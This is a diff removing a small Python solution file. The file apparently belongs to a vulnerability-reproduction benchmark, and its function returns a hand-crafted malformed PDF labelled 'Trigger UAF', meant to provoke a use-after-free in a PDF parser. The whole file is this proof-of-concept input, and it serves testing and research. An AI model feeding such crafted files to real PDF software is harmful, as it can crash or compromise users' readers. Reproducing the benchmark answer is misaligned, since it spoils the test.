@@ -1,4 +1,0 @@
-class Solution:
-    def solve(self, src_path: str) -> bytes:
-        poc = b'%PDF-1.5\n%âãÏÓ\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>\nendobj\n4 0 obj\n<</Type/ObjStm/N 2/First 15/Length 200>>\nstream\n6 20 7 100\n<</Length 30>>\nstream\nBT\n/F1 12 Tf\n100 700 Td\n(Trigger UAF) Tj\nET\nendstream\n<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>\nendstream\nendobj\n5 0 obj\n<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>\nendobj\nxref\n0 8\n0000000000 65535 f\n0000000009 00000 n\n0000000050 00000 n\n0000000120 00000 n\n0000000300 00000 n\n0000000800 00000 n\n0000000000 00000 n\n0000000000 00000 n\ntrailer\n<</Size 8/Root 1 0 R/XRefStm 300>>\nstartxref\n900\n%%EOF'
-        return poc
